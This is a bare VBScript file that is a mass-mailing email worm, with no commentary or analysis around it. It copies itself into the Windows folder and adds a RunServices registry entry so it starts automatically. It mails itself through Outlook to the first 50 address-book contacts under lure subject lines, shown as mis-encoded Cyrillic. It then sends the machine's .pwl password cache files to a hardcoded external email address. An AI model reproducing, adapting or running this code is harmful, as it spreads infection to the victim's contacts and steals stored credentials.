   On Error Resume Next
   Dim FileSysObject, File
   Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
   Set File = FileSysObject.GetFile(WScript.ScriptFullName)
   File.Copy ("c:\windows\winsystem.vbs")
   Dim WshShell
   Set WshShell = WScript.CreateObject("WScript.Shell")
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\iexplores", "c:\windows\winsystem.vbs"
   Dim OutlookObject, OutMail, Index
   Set OutlookObject = CreateObject("Outlook.Application")
   For Index = 1 To 50
   Set OutMail = OutlookObject.CreateItem(0)
   OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
   OutMail.Subject = "òóò ïðîãó îäíó íàø¸ë..."
   OutMail.Body = "ðóë¸çíàÿ âåùü"
   OutMail.Attachments.Add(WScript.ScriptFullName)
   OutMail.Send
   Next
   Set OutMail = OutlookObject.CreateItem(0)
   OutMail.to = "ronin911t@mailru.com"
   OutMail.Subject = "ïîëó÷è îò ìåíÿ"
   OutMail.Body = "îò ëàìåðà"
   OutMail.Attachments.Add("c:\windows\*.pwl")
   OutMail.Send
